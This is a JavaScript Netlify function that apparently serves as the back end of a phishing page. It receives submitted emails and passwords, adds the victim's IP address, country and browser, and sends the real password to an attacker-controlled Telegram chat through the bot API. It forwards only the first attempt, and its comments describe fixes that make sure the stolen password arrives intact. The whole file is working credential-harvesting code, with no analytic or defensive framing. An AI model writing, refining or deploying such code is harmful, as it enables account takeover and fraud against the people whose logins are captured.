// netlify/functions/login.js
// Final fix: Wraps the Telegram message content in a MarkdownV2 code block and sends the actual password.
// This prevents any special characters from breaking the API call.

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

const CORS_HEADERS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, X-First-Attempt'
};

exports.handler = async (event, context) => {
  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 204, headers: CORS_HEADERS, body: '' };
  }

  try {
    let body;
    try {
      body = event.body ? JSON.parse(event.body) : {};
    } catch (e) {
      return { statusCode: 400, headers: CORS_HEADERS, body: JSON.stringify({ error: 'invalid_json' }) };
    }

    const { email, password, country, userAgent: bodyUserAgent } = body;
    const ip = (event.headers['x-forwarded-for'] || '').split(',')[0].trim() || (event.requestContext && event.requestContext.identity && event.requestContext.identity.sourceIp) || 'unknown';
    const userAgent = bodyUserAgent || event.headers['user-agent'] || '';

    if (!email || !password) {
      return { statusCode: 400, headers: CORS_HEADERS, body: JSON.stringify({ error: 'Missing email or password' }) };
    }

    const isFirstAttempt = (event.headers['x-first-attempt'] === '1');
    const now = new Date();

    // --- FIX: Use a code block for the data to prevent markdown errors and send actual password ---
    const dataBlock = [
      `Email: ${String(email)}`,
      `Password: ${String(password)}`, // Sends the real password
      `IP: ${String(ip)}`,
      `Country: ${String(country || '')}`,
      `User-Agent: ${String(userAgent || '')}`,
      `Time (UTC): ${now.toISOString()}`
    ].join('\n');

    const text = '*Login Attempt Received*\n```\n' + dataBlock + '\n```';

    if (!isFirstAttempt) {
      return { statusCode: 200, headers: CORS_HEADERS, body: JSON.stringify({ forwarded: false, reason: 'not_first_attempt' }) };
    }

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.log('Telegram not configured — would forward this message:\n', text);
      return { statusCode: 200, headers: CORS_HEADERS, body: JSON.stringify({ forwarded: false, warning: 'telegram_not_configured' }) };
    }

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const payload = {
      chat_id: TELEGRAM_CHAT_ID,
      parse_mode: 'MarkdownV2',
      text
    };

    const tgRes = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });

    const tgJson = await tgRes.json();

    if (!tgJson.ok) {
      console.error('Telegram API returned error:', tgJson);
      return { statusCode: 502, headers: CORS_HEADERS, body: JSON.stringify({ error: 'Telegram API error', details: tgJson }) };
    }

    return { statusCode: 200, headers: CORS_HEADERS, body: JSON.stringify({ forwarded: true }) };
  } catch (err) {
    console.error('Error in function login:', err && (err.stack || err.message || err));
    return { statusCode: 500, headers: CORS_HEADERS, body: JSON.stringify({ error: 'server_error', message: err && (err.message || String(err)) }) };
  }
};
